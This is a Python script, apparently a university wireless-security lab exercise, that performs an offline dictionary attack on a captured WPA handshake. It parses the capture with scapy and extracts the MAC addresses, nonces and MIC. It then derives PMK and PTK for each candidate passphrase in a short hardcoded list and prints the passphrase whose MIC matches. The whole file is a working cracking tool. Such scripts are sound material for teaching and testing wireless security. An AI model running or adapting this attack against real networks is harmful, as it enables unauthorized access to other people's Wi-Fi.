#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
...
"""

__author__      = "-"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, association, handshake and data
wpa=rdpcap("wpa_handshake.cap")
ssid = "SWI"

for packet in wpa :
    # Le premier paquet avec le type, le sous-type et le proto à 0 -> Association Request, contient toutes les infos nécessaires
    if (packet.type == 0x0) and (packet.subtype == 0x0) and (packet.proto == 0x0) and (packet.info.decode('ascii') == ssid):
        # Adresse MAC de l'AP
        APmac = a2b_hex((packet.addr1).replace(":", ""))
        # Adresse de la station
        Clientmac = a2b_hex((packet.addr2).replace(":", ""))
        print("Attacking network : ", ssid)
        break

for packet in wpa :
    if (packet.type == 0x2) and (packet.subtype == 0x0) and (packet.proto == 0x0) :
        #and (APmac == a2b_hex(packet.addr1.replace(":", ""))) and (Clientmac == a2b_hex((packet.addr2).replace(":", ""))) :
        ANonce = packet.load[13:45]
        break

first_packet = True

for packet in wpa :
    if first_packet and (packet.type == 0x0) and (packet.subtype == 0x0) and (packet.proto == 0x1) :
        #and (APmac == packet.addr1.replace(":", "")) and (Clientmac == (packet.addr2).replace(":", "")) :
        SNonce = Dot11Elt(packet).load[65:97]
        first_packet = False

    elif (packet.type == 0x0) and (packet.subtype == 0x0) and (packet.proto == 0x1) :
        #and (APmac == packet.addr1.replace(":", "")) and (Clientmac == (packet.addr2).replace(":", "")) :
        mic_to_test = Dot11Elt(packet).load[129:-2].hex()
        break

for passPhrase in ["pouet", "actuelle", "prout"] :
    A           = "Pairwise key expansion" #this string is used in the pseudo-random function
    B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
    data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée

    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    passPhrase = str.encode(passPhrase)
    pmk = pbkdf2(hashlib.sha1,passPhrase, str.encode(ssid), 4096, 32)

    #expand pmk to obtain PTK
    ptk = customPRF512(pmk,str.encode(A),B)

    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16],data,hashlib.sha1)

    current_mic = mic.hexdigest()[:-8]

    if current_mic == mic_to_test :
        print("Passphrase found : ", passPhrase.decode())
        exit(0)

print("No passphrase found")
exit(1)